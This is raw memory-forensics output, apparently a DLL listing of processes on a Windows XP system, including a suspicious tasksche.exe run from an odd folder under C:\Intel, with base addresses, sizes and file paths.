1152	svchost.exe	0x74d90000	0x6b000	USP10.dll	C:\WINDOWS\system32\USP10.dll	N/A	Disabled
1152	svchost.exe	0x773d0000	0x103000	comctl32.dll	C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202\comctl32.dll	N/A	Disabled
1152	svchost.exe	0x5d090000	0x9a000	comctl32.dll	C:\WINDOWS\system32\comctl32.dll	N/A	Disabled
1152	svchost.exe	0x77690000	0x21000	NTMARTA.DLL	C:\WINDOWS\system32\NTMARTA.DLL	N/A	Disabled
1152	svchost.exe	0x71bf0000	0x13000	SAMLIB.dll	C:\WINDOWS\system32\SAMLIB.dll	N/A	Disabled
1152	svchost.exe	0x76f60000	0x2c000	WLDAP32.dll	C:\WINDOWS\system32\WLDAP32.dll	N/A	Disabled
1152	svchost.exe	0x6e0000	0x2c5000	xpsp2res.dll	C:\WINDOWS\system32\xpsp2res.dll	N/A	Disabled
1152	svchost.exe	0x74c40000	0x6000	lmhsvc.dll	c:\windows\system32\lmhsvc.dll	N/A	Disabled
1152	svchost.exe	0x76d60000	0x19000	iphlpapi.dll	c:\windows\system32\iphlpapi.dll	N/A	Disabled
1152	svchost.exe	0x71ab0000	0x17000	WS2_32.dll	c:\windows\system32\WS2_32.dll	N/A	Disabled
1152	svchost.exe	0x71aa0000	0x8000	WS2HELP.dll	c:\windows\system32\WS2HELP.dll	N/A	Disabled
1152	svchost.exe	0x76af0000	0x12000	regsvc.dll	c:\windows\system32\regsvc.dll	N/A	Disabled
1152	svchost.exe	0x59c00000	0x7000	credssp.dll	C:\WINDOWS\system32\credssp.dll	N/A	Disabled
1152	svchost.exe	0x77a80000	0x97000	CRYPT32.dll	C:\WINDOWS\system32\CRYPT32.dll	N/A	Disabled
1152	svchost.exe	0x77b20000	0x12000	MSASN1.dll	C:\WINDOWS\system32\MSASN1.dll	N/A	Disabled
1152	svchost.exe	0x767f0000	0x29000	schannel.dll	C:\WINDOWS\system32\schannel.dll	N/A	Disabled
1152	svchost.exe	0x5b860000	0x56000	NETAPI32.dll	C:\WINDOWS\system32\NETAPI32.dll	N/A	Disabled
1152	svchost.exe	0x765e0000	0x14000	ssdpsrv.dll	c:\windows\system32\ssdpsrv.dll	N/A	Disabled
1152	svchost.exe	0x662b0000	0x58000	hnetcfg.dll	C:\WINDOWS\system32\hnetcfg.dll	N/A	Disabled
1152	svchost.exe	0x76fd0000	0x7f000	CLBCATQ.DLL	C:\WINDOWS\system32\CLBCATQ.DLL	N/A	Disabled
1152	svchost.exe	0x77050000	0xc5000	COMRes.dll	C:\WINDOWS\system32\COMRes.dll	N/A	Disabled
1152	svchost.exe	0x71a50000	0x3f000	mswsock.dll	C:\WINDOWS\system32\mswsock.dll	N/A	Disabled
1152	svchost.exe	0x71a90000	0x8000	wshtcpip.dll	C:\WINDOWS\System32\wshtcpip.dll	N/A	Disabled
1484	spoolsv.exe	0x1000000	0x10000	spoolsv.exe	C:\WINDOWS\system32\spoolsv.exe	N/A	Disabled
1484	spoolsv.exe	0x7c900000	0xb2000	ntdll.dll	C:\WINDOWS\system32\ntdll.dll	N/A	Disabled
1484	spoolsv.exe	0x7c800000	0xf6000	kernel32.dll	C:\WINDOWS\system32\kernel32.dll	N/A	Disabled
1484	spoolsv.exe	0x77dd0000	0x9b000	ADVAPI32.dll	C:\WINDOWS\system32\ADVAPI32.dll	N/A	Disabled
1484	spoolsv.exe	0x77e70000	0x93000	RPCRT4.dll	C:\WINDOWS\system32\RPCRT4.dll	N/A	Disabled
1484	spoolsv.exe	0x77fe0000	0x11000	Secur32.dll	C:\WINDOWS\system32\Secur32.dll	N/A	Disabled
1484	spoolsv.exe	0x77f10000	0x49000	GDI32.dll	C:\WINDOWS\system32\GDI32.dll	N/A	Disabled
1484	spoolsv.exe	0x7e410000	0x91000	USER32.dll	C:\WINDOWS\system32\USER32.dll	N/A	Disabled
1484	spoolsv.exe	0x77c10000	0x58000	msvcrt.dll	C:\WINDOWS\system32\msvcrt.dll	N/A	Disabled
1484	spoolsv.exe	0x5cb70000	0x26000	ShimEng.dll	C:\WINDOWS\system32\ShimEng.dll	N/A	Disabled
1484	spoolsv.exe	0x6f880000	0x1ca000	AcGenral.DLL	C:\WINDOWS\AppPatch\AcGenral.DLL	N/A	Disabled
1484	spoolsv.exe	0x76b40000	0x2d000	WINMM.dll	C:\WINDOWS\system32\WINMM.dll	N/A	Disabled
1484	spoolsv.exe	0x774e0000	0x13e000	ole32.dll	C:\WINDOWS\system32\ole32.dll	N/A	Disabled
1484	spoolsv.exe	0x77120000	0x8b000	OLEAUT32.dll	C:\WINDOWS\system32\OLEAUT32.dll	N/A	Disabled
1484	spoolsv.exe	0x77be0000	0x15000	MSACM32.dll	C:\WINDOWS\system32\MSACM32.dll	N/A	Disabled
1484	spoolsv.exe	0x77c00000	0x8000	VERSION.dll	C:\WINDOWS\system32\VERSION.dll	N/A	Disabled
1484	spoolsv.exe	0x7c9c0000	0x818000	SHELL32.dll	C:\WINDOWS\system32\SHELL32.dll	N/A	Disabled
1484	spoolsv.exe	0x77f60000	0x76000	SHLWAPI.dll	C:\WINDOWS\system32\SHLWAPI.dll	N/A	Disabled
1484	spoolsv.exe	0x769c0000	0xb4000	USERENV.dll	C:\WINDOWS\system32\USERENV.dll	N/A	Disabled
1484	spoolsv.exe	0x5ad70000	0x38000	UxTheme.dll	C:\WINDOWS\system32\UxTheme.dll	N/A	Disabled
1484	spoolsv.exe	0x76390000	0x1d000	IMM32.DLL	C:\WINDOWS\system32\IMM32.DLL	N/A	Disabled
1484	spoolsv.exe	0x629c0000	0x9000	LPK.DLL	C:\WINDOWS\system32\LPK.DLL	N/A	Disabled
1484	spoolsv.exe	0x74d90000	0x6b000	USP10.dll	C:\WINDOWS\system32\USP10.dll	N/A	Disabled
1484	spoolsv.exe	0x773d0000	0x103000	comctl32.dll	C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202\comctl32.dll	N/A	Disabled
1484	spoolsv.exe	0x5d090000	0x9a000	comctl32.dll	C:\WINDOWS\system32\comctl32.dll	N/A	Disabled
1484	spoolsv.exe	0x742e0000	0x15000	SPOOLSS.DLL	C:\WINDOWS\system32\SPOOLSS.DLL	N/A	Disabled
1484	spoolsv.exe	0x71ab0000	0x17000	WS2_32.dll	C:\WINDOWS\system32\WS2_32.dll	N/A	Disabled
1484	spoolsv.exe	0x71aa0000	0x8000	WS2HELP.dll	C:\WINDOWS\system32\WS2HELP.dll	N/A	Disabled
1484	spoolsv.exe	0x76f20000	0x27000	DNSAPI.dll	C:\WINDOWS\system32\DNSAPI.dll	N/A	Disabled
1484	spoolsv.exe	0x76d60000	0x19000	iphlpapi.dll	C:\WINDOWS\system32\iphlpapi.dll	N/A	Disabled
1484	spoolsv.exe	0x76fc0000	0x6000	rasadhlp.dll	C:\WINDOWS\system32\rasadhlp.dll	N/A	Disabled
1484	spoolsv.exe	0x75bb0000	0x57000	localspl.dll	C:\WINDOWS\system32\localspl.dll	N/A	Disabled
1484	spoolsv.exe	0x76c60000	0x2a000	sfc_os.dll	C:\WINDOWS\system32\sfc_os.dll	N/A	Disabled
1484	spoolsv.exe	0x76c30000	0x2e000	WINTRUST.dll	C:\WINDOWS\system32\WINTRUST.dll	N/A	Disabled
1484	spoolsv.exe	0x77a80000	0x97000	CRYPT32.dll	C:\WINDOWS\system32\CRYPT32.dll	N/A	Disabled
1484	spoolsv.exe	0x77b20000	0x12000	MSASN1.dll	C:\WINDOWS\system32\MSASN1.dll	N/A	Disabled
1484	spoolsv.exe	0x76c90000	0x28000	IMAGEHLP.dll	C:\WINDOWS\system32\IMAGEHLP.dll	N/A	Disabled
1484	spoolsv.exe	0x73000000	0x26000	winspool.drv	C:\WINDOWS\system32\winspool.drv	N/A	Disabled
1484	spoolsv.exe	0x5b860000	0x56000	netapi32.dll	C:\WINDOWS\system32\netapi32.dll	N/A	Disabled
1484	spoolsv.exe	0x742a0000	0xe000	cnbjmon.dll	C:\WINDOWS\system32\cnbjmon.dll	N/A	Disabled
1484	spoolsv.exe	0x74280000	0x7000	pjlmon.dll	C:\WINDOWS\system32\pjlmon.dll	N/A	Disabled
1484	spoolsv.exe	0x72400000	0xe000	tcpmon.dll	C:\WINDOWS\system32\tcpmon.dll	N/A	Disabled
1484	spoolsv.exe	0x723f0000	0x7000	usbmon.dll	C:\WINDOWS\system32\usbmon.dll	N/A	Disabled
1484	spoolsv.exe	0x71a50000	0x3f000	mswsock.dll	C:\WINDOWS\System32\mswsock.dll	N/A	Disabled
1484	spoolsv.exe	0x76fb0000	0x8000	winrnr.dll	C:\WINDOWS\System32\winrnr.dll	N/A	Disabled
1484	spoolsv.exe	0x76f60000	0x2c000	WLDAP32.dll	C:\WINDOWS\system32\WLDAP32.dll	N/A	Disabled
1484	spoolsv.exe	0x75c10000	0x24000	win32spl.dll	C:\WINDOWS\system32\win32spl.dll	N/A	Disabled
1484	spoolsv.exe	0x71c80000	0x7000	NETRAP.dll	C:\WINDOWS\system32\NETRAP.dll	N/A	Disabled
1484	spoolsv.exe	0x767a0000	0x14000	NTDSAPI.dll	C:\WINDOWS\system32\NTDSAPI.dll	N/A	Disabled
1484	spoolsv.exe	0x76fd0000	0x7f000	CLBCATQ.DLL	C:\WINDOWS\system32\CLBCATQ.DLL	N/A	Disabled
1484	spoolsv.exe	0x77050000	0xc5000	COMRes.dll	C:\WINDOWS\system32\COMRes.dll	N/A	Disabled
1484	spoolsv.exe	0x1010000	0x2c5000	xpsp2res.dll	C:\WINDOWS\system32\xpsp2res.dll	N/A	Disabled
1484	spoolsv.exe	0x74300000	0x15000	inetpp.dll	C:\WINDOWS\system32\inetpp.dll	N/A	Disabled
1636	explorer.exe	0x1000000	0xff000	Explorer.EXE	C:\WINDOWS\Explorer.EXE	N/A	Disabled
1636	explorer.exe	0x7c900000	0xb2000	ntdll.dll	C:\WINDOWS\system32\ntdll.dll	N/A	Disabled
1636	explorer.exe	0x7c800000	0xf6000	kernel32.dll	C:\WINDOWS\system32\kernel32.dll	N/A	Disabled
1636	explorer.exe	0x77dd0000	0x9b000	ADVAPI32.dll	C:\WINDOWS\system32\ADVAPI32.dll	N/A	Disabled
1636	explorer.exe	0x77e70000	0x93000	RPCRT4.dll	C:\WINDOWS\system32\RPCRT4.dll	N/A	Disabled
1636	explorer.exe	0x77fe0000	0x11000	Secur32.dll	C:\WINDOWS\system32\Secur32.dll	N/A	Disabled
1636	explorer.exe	0x75f80000	0xfd000	BROWSEUI.dll	C:\WINDOWS\system32\BROWSEUI.dll	N/A	Disabled
1636	explorer.exe	0x77f10000	0x49000	GDI32.dll	C:\WINDOWS\system32\GDI32.dll	N/A	Disabled
1636	explorer.exe	0x7e410000	0x91000	USER32.dll	C:\WINDOWS\system32\USER32.dll	N/A	Disabled
1636	explorer.exe	0x77c10000	0x58000	msvcrt.dll	C:\WINDOWS\system32\msvcrt.dll	N/A	Disabled
1636	explorer.exe	0x774e0000	0x13e000	ole32.dll	C:\WINDOWS\system32\ole32.dll	N/A	Disabled
1636	explorer.exe	0x77f60000	0x76000	SHLWAPI.dll	C:\WINDOWS\system32\SHLWAPI.dll	N/A	Disabled
1636	explorer.exe	0x77120000	0x8b000	OLEAUT32.dll	C:\WINDOWS\system32\OLEAUT32.dll	N/A	Disabled
1636	explorer.exe	0x7e290000	0x173000	SHDOCVW.dll	C:\WINDOWS\system32\SHDOCVW.dll	N/A	Disabled
1636	explorer.exe	0x77a80000	0x97000	CRYPT32.dll	C:\WINDOWS\system32\CRYPT32.dll	N/A	Disabled
1636	explorer.exe	0x77b20000	0x12000	MSASN1.dll	C:\WINDOWS\system32\MSASN1.dll	N/A	Disabled
1636	explorer.exe	0x754d0000	0x80000	CRYPTUI.dll	C:\WINDOWS\system32\CRYPTUI.dll	N/A	Disabled
1636	explorer.exe	0x5b860000	0x56000	NETAPI32.dll	C:\WINDOWS\system32\NETAPI32.dll	N/A	Disabled
1636	explorer.exe	0x77c00000	0x8000	VERSION.dll	C:\WINDOWS\system32\VERSION.dll	N/A	Disabled
1636	explorer.exe	0x3d930000	0xe7000	WININET.dll	C:\WINDOWS\system32\WININET.dll	N/A	Disabled
1636	explorer.exe	0x400000	0x9000	Normaliz.dll	C:\WINDOWS\system32\Normaliz.dll	N/A	Disabled
1636	explorer.exe	0x78130000	0x134000	urlmon.dll	C:\WINDOWS\system32\urlmon.dll	N/A	Disabled
1636	explorer.exe	0x3dfd0000	0x1ec000	iertutil.dll	C:\WINDOWS\system32\iertutil.dll	N/A	Disabled
1636	explorer.exe	0x76c30000	0x2e000	WINTRUST.dll	C:\WINDOWS\system32\WINTRUST.dll	N/A	Disabled
1636	explorer.exe	0x76c90000	0x28000	IMAGEHLP.dll	C:\WINDOWS\system32\IMAGEHLP.dll	N/A	Disabled
1636	explorer.exe	0x76f60000	0x2c000	WLDAP32.dll	C:\WINDOWS\system32\WLDAP32.dll	N/A	Disabled
1636	explorer.exe	0x7c9c0000	0x818000	SHELL32.dll	C:\WINDOWS\system32\SHELL32.dll	N/A	Disabled
1636	explorer.exe	0x5ad70000	0x38000	UxTheme.dll	C:\WINDOWS\system32\UxTheme.dll	N/A	Disabled
1636	explorer.exe	0x5cb70000	0x26000	ShimEng.dll	C:\WINDOWS\system32\ShimEng.dll	N/A	Disabled
1636	explorer.exe	0x6f880000	0x1ca000	AcGenral.DLL	C:\WINDOWS\AppPatch\AcGenral.DLL	N/A	Disabled
1636	explorer.exe	0x76b40000	0x2d000	WINMM.dll	C:\WINDOWS\system32\WINMM.dll	N/A	Disabled
1636	explorer.exe	0x77be0000	0x15000	MSACM32.dll	C:\WINDOWS\system32\MSACM32.dll	N/A	Disabled
1636	explorer.exe	0x769c0000	0xb4000	USERENV.dll	C:\WINDOWS\system32\USERENV.dll	N/A	Disabled
1636	explorer.exe	0x76390000	0x1d000	IMM32.DLL	C:\WINDOWS\system32\IMM32.DLL	N/A	Disabled
1636	explorer.exe	0x629c0000	0x9000	LPK.DLL	C:\WINDOWS\system32\LPK.DLL	N/A	Disabled
1636	explorer.exe	0x74d90000	0x6b000	USP10.dll	C:\WINDOWS\system32\USP10.dll	N/A	Disabled
1636	explorer.exe	0x773d0000	0x103000	comctl32.dll	C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202\comctl32.dll	N/A	Disabled
1636	explorer.exe	0x5d090000	0x9a000	comctl32.dll	C:\WINDOWS\system32\comctl32.dll	N/A	Disabled
1636	explorer.exe	0x755c0000	0x2e000	msctfime.ime	C:\WINDOWS\system32\msctfime.ime	N/A	Disabled
1636	explorer.exe	0x77b40000	0x22000	appHelp.dll	C:\WINDOWS\system32\appHelp.dll	N/A	Disabled
1636	explorer.exe	0x76fd0000	0x7f000	CLBCATQ.DLL	C:\WINDOWS\system32\CLBCATQ.DLL	N/A	Disabled
1636	explorer.exe	0x77050000	0xc5000	COMRes.dll	C:\WINDOWS\system32\COMRes.dll	N/A	Disabled
1636	explorer.exe	0x77a20000	0x54000	cscui.dll	C:\WINDOWS\System32\cscui.dll	N/A	Disabled
1636	explorer.exe	0x76600000	0x1d000	CSCDLL.dll	C:\WINDOWS\System32\CSCDLL.dll	N/A	Disabled
1636	explorer.exe	0x5ba60000	0x71000	themeui.dll	C:\WINDOWS\system32\themeui.dll	N/A	Disabled
1636	explorer.exe	0x76380000	0x5000	MSIMG32.dll	C:\WINDOWS\system32\MSIMG32.dll	N/A	Disabled
1636	explorer.exe	0x1100000	0x2c5000	xpsp2res.dll	C:\WINDOWS\system32\xpsp2res.dll	N/A	Disabled
1636	explorer.exe	0x71d40000	0x1b000	ACTXPRXY.DLL	C:\WINDOWS\system32\ACTXPRXY.DLL	N/A	Disabled
1636	explorer.exe	0x5fc10000	0x33000	msutb.dll	C:\WINDOWS\system32\msutb.dll	N/A	Disabled
1636	explorer.exe	0x74720000	0x4c000	MSCTF.dll	C:\WINDOWS\system32\MSCTF.dll	N/A	Disabled
1636	explorer.exe	0x71bf0000	0x13000	SAMLIB.dll	C:\WINDOWS\system32\SAMLIB.dll	N/A	Disabled
1636	explorer.exe	0x76980000	0x8000	LINKINFO.dll	C:\WINDOWS\system32\LINKINFO.dll	N/A	Disabled
1636	explorer.exe	0x76990000	0x25000	ntshrui.dll	C:\WINDOWS\system32\ntshrui.dll	N/A	Disabled
1636	explorer.exe	0x76b20000	0x11000	ATL.DLL	C:\WINDOWS\system32\ATL.DLL	N/A	Disabled
1636	explorer.exe	0x3e1c0000	0xa9d000	ieframe.dll	C:\WINDOWS\system32\ieframe.dll	N/A	Disabled
1636	explorer.exe	0x5cb00000	0x6e000	shimgvw.dll	C:\WINDOWS\system32\shimgvw.dll	N/A	Disabled
1636	explorer.exe	0x4ec50000	0x1ab000	gdiplus.dll	C:\WINDOWS\WinSxS\x86_Microsoft.Windows.GdiPlus_6595b64144ccf1df_1.0.6002.23084_x-ww_f3f35550\gdiplus.dll	N/A	Disabled
1636	explorer.exe	0x77920000	0xf3000	SETUPAPI.dll	C:\WINDOWS\system32\SETUPAPI.dll	N/A	Disabled
1636	explorer.exe	0x3fde0000	0x440000	msi.dll	C:\WINDOWS\system32\msi.dll	N/A	Disabled
1636	explorer.exe	0x76400000	0x1a5000	NETSHELL.dll	C:\WINDOWS\system32\NETSHELL.dll	N/A	Disabled
1636	explorer.exe	0x76c00000	0x2e000	credui.dll	C:\WINDOWS\system32\credui.dll	N/A	Disabled
1636	explorer.exe	0x478c0000	0xa000	dot3api.dll	C:\WINDOWS\system32\dot3api.dll	N/A	Disabled
1636	explorer.exe	0x76e80000	0xe000	rtutils.dll	C:\WINDOWS\system32\rtutils.dll	N/A	Disabled
1636	explorer.exe	0x736d0000	0x6000	dot3dlg.dll	C:\WINDOWS\system32\dot3dlg.dll	N/A	Disabled
1636	explorer.exe	0x5dca0000	0x28000	OneX.DLL	C:\WINDOWS\system32\OneX.DLL	N/A	Disabled
1636	explorer.exe	0x76f50000	0x8000	WTSAPI32.dll	C:\WINDOWS\system32\WTSAPI32.dll	N/A	Disabled
1636	explorer.exe	0x76360000	0x10000	WINSTA.dll	C:\WINDOWS\system32\WINSTA.dll	N/A	Disabled
1636	explorer.exe	0x745b0000	0x22000	eappcfg.dll	C:\WINDOWS\system32\eappcfg.dll	N/A	Disabled
1636	explorer.exe	0x76080000	0x65000	MSVCP60.dll	C:\WINDOWS\system32\MSVCP60.dll	N/A	Disabled
1636	explorer.exe	0x5dcd0000	0xe000	eappprxy.dll	C:\WINDOWS\system32\eappprxy.dll	N/A	Disabled
1636	explorer.exe	0x76d60000	0x19000	iphlpapi.dll	C:\WINDOWS\system32\iphlpapi.dll	N/A	Disabled
1636	explorer.exe	0x71ab0000	0x17000	WS2_32.dll	C:\WINDOWS\system32\WS2_32.dll	N/A	Disabled
1636	explorer.exe	0x71aa0000	0x8000	WS2HELP.dll	C:\WINDOWS\system32\WS2HELP.dll	N/A	Disabled
1636	explorer.exe	0x17d0000	0x3d000	webcheck.dll	C:\WINDOWS\system32\webcheck.dll	N/A	Disabled
1636	explorer.exe	0x75cf0000	0x91000	MLANG.dll	C:\WINDOWS\system32\MLANG.dll	N/A	Disabled
1636	explorer.exe	0x76280000	0x21000	stobject.dll	C:\WINDOWS\system32\stobject.dll	N/A	Disabled
1636	explorer.exe	0x74af0000	0xa000	BatMeter.dll	C:\WINDOWS\system32\BatMeter.dll	N/A	Disabled
1636	explorer.exe	0x74ad0000	0x8000	POWRPROF.dll	C:\WINDOWS\system32\POWRPROF.dll	N/A	Disabled
1636	explorer.exe	0x72d20000	0x9000	wdmaud.drv	C:\WINDOWS\system32\wdmaud.drv	N/A	Disabled
1636	explorer.exe	0x72d10000	0x8000	msacm32.drv	C:\WINDOWS\system32\msacm32.drv	N/A	Disabled
1636	explorer.exe	0x77bd0000	0x7000	midimap.dll	C:\WINDOWS\system32\midimap.dll	N/A	Disabled
1636	explorer.exe	0x71b20000	0x12000	MPR.dll	C:\WINDOWS\system32\MPR.dll	N/A	Disabled
1636	explorer.exe	0x75f60000	0x7000	drprov.dll	C:\WINDOWS\System32\drprov.dll	N/A	Disabled
1636	explorer.exe	0x71c10000	0xe000	ntlanman.dll	C:\WINDOWS\System32\ntlanman.dll	N/A	Disabled
1636	explorer.exe	0x71cd0000	0x17000	NETUI0.dll	C:\WINDOWS\System32\NETUI0.dll	N/A	Disabled
1636	explorer.exe	0x71c90000	0x40000	NETUI1.dll	C:\WINDOWS\System32\NETUI1.dll	N/A	Disabled
1636	explorer.exe	0x71c80000	0x7000	NETRAP.dll	C:\WINDOWS\System32\NETRAP.dll	N/A	Disabled
1636	explorer.exe	0x75f70000	0xa000	davclnt.dll	C:\WINDOWS\System32\davclnt.dll	N/A	Disabled
1940	tasksche.exe	0x400000	0x35a000	tasksche.exe	C:\Intel\ivecuqmanpnirkt615\tasksche.exe	N/A	Disabled
1940	tasksche.exe	0x7c900000	0xb2000	ntdll.dll	C:\WINDOWS\system32\ntdll.dll	N/A	Disabled
1940	tasksche.exe	0x7c800000	0xf6000	kernel32.dll	C:\WINDOWS\system32\kernel32.dll	N/A	Disabled
1940	tasksche.exe	0x7e410000	0x91000	USER32.dll	C:\WINDOWS\system32\USER32.dll	N/A	Disabled
1940	tasksche.exe	0x77f10000	0x49000	GDI32.dll	C:\WINDOWS\system32\GDI32.dll	N/A	Disabled
1940	tasksche.exe	0x77dd0000	0x9b000	ADVAPI32.dll	C:\WINDOWS\system32\ADVAPI32.dll	N/A	Disabled
1940	tasksche.exe	0x77e70000	0x93000	RPCRT4.dll	C:\WINDOWS\system32\RPCRT4.dll	N/A	Disabled
1940	tasksche.exe	0x77fe0000	0x11000	Secur32.dll	C:\WINDOWS\system32\Secur32.dll	N/A	Disabled
1940	tasksche.exe	0x77c10000	0x58000	MSVCRT.dll	C:\WINDOWS\system32\MSVCRT.dll	N/A	Disabled
1940	tasksche.exe	0x76390000	0x1d000	IMM32.DLL	C:\WINDOWS\system32\IMM32.DLL	N/A	Disabled
1940	tasksche.exe	0x629c0000	0x9000	LPK.DLL	C:\WINDOWS\system32\LPK.DLL	N/A	Disabled
1940	tasksche.exe	0x74d90000	0x6b000	USP10.dll	C:\WINDOWS\system32\USP10.dll	N/A	Disabled
1940	tasksche.exe	0x77b40000	0x22000	Apphelp.dll	C:\WINDOWS\system32\Apphelp.dll	N/A	Disabled
1940	tasksche.exe	0x77c00000	0x8000	VERSION.dll	C:\WINDOWS\system32\VERSION.dll	N/A	Disabled
1940	tasksche.exe	0x68000000	0x36000	rsaenh.dll	C:\WINDOWS\system32\rsaenh.dll	N/A	Disabled
1940	tasksche.exe	0x7c9c0000	0x818000	SHELL32.dll	C:\WINDOWS\system32\SHELL32.dll	N/A	Disabled
1940	tasksche.exe	0x77f60000	0x76000	SHLWAPI.dll	C:\WINDOWS\system32\SHLWAPI.dll	N/A	Disabled
1940	tasksche.exe	0x773d0000	0x103000	comctl32.dll	C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202\comctl32.dll	N/A	Disabled
1940	tasksche.exe	0x76080000	0x65000	MSVCP60.dll	C:\WINDOWS\system32\MSVCP60.dll	N/A	Disabled
1940	tasksche.exe	0x77690000	0x21000	NTMARTA.DLL	C:\WINDOWS\system32\NTMARTA.DLL	N/A	Disabled
1940	tasksche.exe	0x774e0000	0x13e000	ole32.dll	C:\WINDOWS\system32\ole32.dll	N/A	Disabled
1940	tasksche.exe	0x71bf0000	0x13000	SAMLIB.dll	C:\WINDOWS\system32\SAMLIB.dll	N/A	Disabled
1940	tasksche.exe	0x76f60000	0x2c000	WLDAP32.dll	C:\WINDOWS\system32\WLDAP32.dll	N/A	Disabled
1940	tasksche.exe	0x769c0000	0xb4000	USERENV.dll	C:\WINDOWS\system32\USERENV.dll	N/A	Disabled
1940	tasksche.exe	0x5ad70000	0x38000	uxtheme.dll	C:\WINDOWS\system32\uxtheme.dll	N/A	Disabled
1956	ctfmon.exe	0x400000	0x6000	ctfmon.exe	C:\WINDOWS\system32\ctfmon.exe	N/A	Disabled
1956	ctfmon.exe	0x7c900000	0xb2000	ntdll.dll	C:\WINDOWS\system32\ntdll.dll	N/A	Disabled
1956	ctfmon.exe	0x7c800000	0xf6000	kernel32.dll	C:\WINDOWS\system32\kernel32.dll	N/A	Disabled
1956	ctfmon.exe	0x77c10000	0x58000	msvcrt.dll	C:\WINDOWS\system32\msvcrt.dll	N/A	Disabled
1956	ctfmon.exe	0x77dd0000	0x9b000	ADVAPI32.dll	C:\WINDOWS\system32\ADVAPI32.dll	N/A	Disabled
1956	ctfmon.exe	0x77e70000	0x93000	RPCRT4.dll	C:\WINDOWS\system32\RPCRT4.dll	N/A	Disabled
1956	ctfmon.exe	0x77fe0000	0x11000	Secur32.dll	C:\WINDOWS\system32\Secur32.dll	N/A	Disabled
1956	ctfmon.exe	0x7e410000	0x91000	USER32.dll	C:\WINDOWS\system32\USER32.dll	N/A	Disabled
1956	ctfmon.exe	0x77f10000	0x49000	GDI32.dll	C:\WINDOWS\system32\GDI32.dll	N/A	Disabled
1956	ctfmon.exe	0x74720000	0x4c000	MSCTF.dll	C:\WINDOWS\system32\MSCTF.dll	N/A	Disabled
1956	ctfmon.exe	0x5fc10000	0x33000	MSUTB.dll	C:\WINDOWS\system32\MSUTB.dll	N/A	Disabled
1956	ctfmon.exe	0x5cb70000	0x26000	ShimEng.dll	C:\WINDOWS\system32\ShimEng.dll	N/A	Disabled
1956	ctfmon.exe	0x6f880000	0x1ca000	AcGenral.DLL	C:\WINDOWS\AppPatch\AcGenral.DLL	N/A	Disabled
1956	ctfmon.exe	0x76b40000	0x2d000	WINMM.dll	C:\WINDOWS\system32\WINMM.dll	N/A	Disabled
1956	ctfmon.exe	0x774e0000	0x13e000	ole32.dll	C:\WINDOWS\system32\ole32.dll	N/A	Disabled
1956	ctfmon.exe	0x77120000	0x8b000	OLEAUT32.dll	C:\WINDOWS\system32\OLEAUT32.dll	N/A	Disabled
1956	ctfmon.exe	0x77be0000	0x15000	MSACM32.dll	C:\WINDOWS\system32\MSACM32.dll	N/A	Disabled
1956	ctfmon.exe	0x77c00000	0x8000	VERSION.dll	C:\WINDOWS\system32\VERSION.dll	N/A	Disabled
1956	ctfmon.exe	0x7c9c0000	0x818000	SHELL32.dll	C:\WINDOWS\system32\SHELL32.dll	N/A	Disabled
1956	ctfmon.exe	0x77f60000	0x76000	SHLWAPI.dll	C:\WINDOWS\system32\SHLWAPI.dll	N/A	Disabled
1956	ctfmon.exe	0x769c0000	0xb4000	USERENV.dll	C:\WINDOWS\system32\USERENV.dll	N/A	Disabled
1956	ctfmon.exe	0x5ad70000	0x38000	UxTheme.dll	C:\WINDOWS\system32\UxTheme.dll	N/A	Disabled
1956	ctfmon.exe	0x76390000	0x1d000	IMM32.DLL	C:\WINDOWS\system32\IMM32.DLL	N/A	Disabled
1956	ctfmon.exe	0x629c0000	0x9000	LPK.DLL	C:\WINDOWS\system32\LPK.DLL	N/A	Disabled
1956	ctfmon.exe	0x74d90000	0x6b000	USP10.dll	C:\WINDOWS\system32\USP10.dll	N/A	Disabled
1956	ctfmon.exe	0x773d0000	0x103000	comctl32.dll	C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202\comctl32.dll	N/A	Disabled
1956	ctfmon.exe	0x755c0000	0x2e000	msctfime.ime	C:\WINDOWS\system32\msctfime.ime	N/A	Disabled
260	svchost.exe	0x1000000	0x6000	svchost.exe	C:\WINDOWS\system32\svchost.exe	N/A	Disabled
260	svchost.exe	0x7c900000	0xb2000	ntdll.dll	C:\WINDOWS\system32\ntdll.dll	N/A	Disabled
260	svchost.exe	0x7c800000	0xf6000	kernel32.dll	C:\WINDOWS\system32\kernel32.dll	N/A	Disabled
260	svchost.exe	0x77dd0000	0x9b000	ADVAPI32.dll	C:\WINDOWS\system32\ADVAPI32.dll	N/A	Disabled
260	svchost.exe	0x77e70000	0x93000	RPCRT4.dll	C:\WINDOWS\system32\RPCRT4.dll	N/A	Disabled
260	svchost.exe	0x77fe0000	0x11000	Secur32.dll	C:\WINDOWS\system32\Secur32.dll	N/A	Disabled
260	svchost.exe	0x5cb70000	0x26000	ShimEng.dll	C:\WINDOWS\system32\ShimEng.dll	N/A	Disabled
260	svchost.exe	0x6f880000	0x1ca000	AcGenral.DLL	C:\WINDOWS\AppPatch\AcGenral.DLL	N/A	Disabled
260	svchost.exe	0x7e410000	0x91000	USER32.dll	C:\WINDOWS\system32\USER32.dll	N/A	Disabled
260	svchost.exe	0x77f10000	0x49000	GDI32.dll	C:\WINDOWS\system32\GDI32.dll	N/A	Disabled
260	svchost.exe	0x76b40000	0x2d000	WINMM.dll	C:\WINDOWS\system32\WINMM.dll	N/A	Disabled
260	svchost.exe	0x774e0000	0x13e000	ole32.dll	C:\WINDOWS\system32\ole32.dll	N/A	Disabled
260	svchost.exe	0x77c10000	0x58000	msvcrt.dll	C:\WINDOWS\system32\msvcrt.dll	N/A	Disabled
260	svchost.exe	0x77120000	0x8b000	OLEAUT32.dll	C:\WINDOWS\system32\OLEAUT32.dll	N/A	Disabled
260	svchost.exe	0x77be0000	0x15000	MSACM32.dll	C:\WINDOWS\system32\MSACM32.dll	N/A	Disabled
260	svchost.exe	0x77c00000	0x8000	VERSION.dll	C:\WINDOWS\system32\VERSION.dll	N/A	Disabled
